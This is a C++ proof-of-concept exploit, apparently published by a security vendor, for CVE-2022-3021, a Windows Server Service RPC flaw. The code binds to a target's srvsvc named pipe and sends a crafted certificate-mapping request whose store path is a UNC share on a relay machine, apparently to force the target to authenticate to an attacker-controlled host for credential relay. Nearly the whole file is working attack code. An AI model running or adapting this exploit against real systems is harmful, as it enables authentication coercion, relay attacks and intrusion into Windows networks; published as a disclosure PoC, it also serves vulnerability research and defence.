/* CVE-2022-3021 PoC code
 * Copyright 2022 Akamai Technologies, Inc.
 * 
 * Licensed under the Apache License, Version 2.0 (the
 * "License"); you may not use this file except in
 * compliance with the License.  You may obtain a copy
 * of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in
 * writing, software distributed under the License is
 * distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR
 * CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing
 * permissions and limitations under the License.
 */
#include <iostream>
#include "srvsvc_h.h"

#pragma comment(lib, "RpcRT4.lib")
const wchar_t* TARGET = L"\\\\TARGET_IP";
const wchar_t* RELAY_MACHINE = L"\\\\RELAY_MACHINE_IP\\root";

int main()
{
    LPWSTR pszHost = (wchar_t*)TARGET;  // The RPC server (target)
    certificate cert = { 0 };
    cert.ServerName = (wchar_t*)L"AAA Certificate Services";
    cert.Subject = (wchar_t*)L"a0110a233e96f107ece2af29ef82a57fd030a4b4";
    cert.Issuer = (wchar_t*)L"CN = AAA Certificate Services\n\
									O = Comodo CA Limited\n\
									L = Salford\n\
									S = Greater Manchester\n\
									C = GB";
    cert.Thumbprint = (wchar_t*)L"d1eb23a46d17d68fd92564c2f1f1601764d8e349";
    cert.FriendlyName = (wchar_t*)L"Sectigo (AAB)";
    cert.NotBefore = (wchar_t*)L"Thursday, 1 January 2004 13:37:00";
    cert.NotAfter = (wchar_t*)L"Monday, 1 January 2029 2:59:59";
    cert.StoreName = (wchar_t*)RELAY_MACHINE;
    cert.StoreLocation = (wchar_t*)RELAY_MACHINE;
    cert.StructMember9 = (wchar_t*)L"StructMember9";
    cert.Flags = 0;
    cert.Type = 0;

    certificate_container container;
    container.cert = &cert;
    RpcTryExcept{
        wprintf(L"Calling LocalrServerCertificateMappingModify\n");
        LocalrServerCertificateMappingModify((SRVSVC_HANDLE)pszHost, 0, &container);
    }
    RpcExcept(1)
    {

    }
    RpcEndExcept
}

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t cBytes)
{
    return((void __RPC_FAR*) malloc(cBytes));
}

void __RPC_USER midl_user_free(void __RPC_FAR* p)
{
    free(p);
}

handle_t __RPC_USER
SRVSVC_HANDLE_bind(SRVSVC_HANDLE pszSystemName)
{
    handle_t hBinding = NULL;
    LPWSTR pszStringBinding;
    RPC_STATUS status;

    wprintf(L"SRVSVC_HANDLE_bind() called\n");

    status = RpcStringBindingComposeW(NULL,
        (RPC_WSTR)L"ncacn_np",
        (RPC_WSTR)pszSystemName,
        (RPC_WSTR)L"\\pipe\\srvsvc",
        NULL,
        (RPC_WSTR*)& pszStringBinding);
    if (status)
    {
        wprintf(L"RpcStringBindingCompose returned 0x%x\n", status);
        return NULL;
    }

    /* Set the binding handle that will be used to bind to the server. */
    status = RpcBindingFromStringBindingW((RPC_WSTR)pszStringBinding,
        &hBinding);
    if (status)
    {
        wprintf(L"RpcBindingFromStringBinding returned 0x%x\n", status);
    }

    status = RpcStringFreeW((RPC_WSTR*)& pszStringBinding);
    if (status)
    {
        wprintf(L"RpcStringFree returned 0x%x\n", status);
    }
    return hBinding;
}


void __RPC_USER
SRVSVC_HANDLE_unbind(SRVSVC_HANDLE pszSystemName,
    handle_t hBinding)
{
    RPC_STATUS status;

    wprintf(L"SRVSVC_HANDLE_unbind() called\n");

    status = RpcBindingFree(&hBinding);
    if (status)
    {
        wprintf(L"RpcBindingFree returned 0x%x\n", status);
    }
}
